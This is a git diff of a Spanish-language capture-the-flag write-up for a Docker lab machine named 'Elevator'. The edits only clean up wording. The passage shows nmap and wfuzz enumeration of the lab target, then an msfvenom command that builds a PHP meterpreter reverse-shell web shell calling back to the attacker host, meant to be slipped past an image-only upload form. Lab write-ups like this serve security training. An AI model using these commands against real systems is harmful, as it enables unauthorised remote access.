@@ -17,6 +17,8 @@ La última línea mapea el puerto del contenedor al 9090 de localhost, para pode
 > IP Kali atacante --> 172.18.0.3  
 > IP Elevator --> 172.18.0.2  
 
+___  
+
 #### FASE ENUMERACIÓN / RECOPILACIÓN:
 
 Primero comenzamos con el escaneo del objetivo (puertos, servicios y versiones). Para ello, utilicé la herramienta nmap:  
@@ -36,10 +38,10 @@ Encontró 3 directorios interesantes (301 y 200):
 > /server-status	    403  
 > /themes/uploads/	 	200  	
 
-Nos interesan los 301 y 200, porque son redirecciones y consultas válidas, respectivamente.  
+Nos interesan los 301 y 200, porque son redirecciones y consultas válidas, respectivamente. El 403 significa "Sin Autorización".  
 Una vez aclarado que no hay más dirs por encontrar, me enfoqué en la búsqueda de recursos (URI):  
 
-`wfuzz -c --hc 404,403 --hw 0 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt"-u "http://172.18.0.2/themes/FUZZ.FUZ2Z"`  
+`wfuzz -c --hc 404,403 --hw 0 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt" -u "http://172.18.0.2/themes/FUZZ.FUZ2Z"`  
 
 > /index.html		      200  
 > /themes/upload.php	  200  
@@ -49,7 +51,7 @@ ____
 		
 #### FASE EXPLOTACIÓN:  
 
-Al buscar en el navegaor la URI /themes/archivo.html, vemos que se trata de un formulario de subida. Por lo visto, sólo acepta imágenes JPG o JPEG, por lo cual debemos pensar en subir nuestra web-shell en una imagen. En mi caso la creé el código PHP con msfvenom:  
+Al acceder a la URI /themes/archivo.html, vemos que se trata de un formulario de subida. Por lo visto, sólo acepta imágenes JPG o JPEG, entonces debemos pensar en subir nuestra web-shell en una imagen. En mi caso la creé el código PHP con msfvenom:  
 
 `msfvenom -p php/meterpreter/reverse_tcp LHOST=172.18.0.3 LPORT=6660 R -o webshell.php`  
 
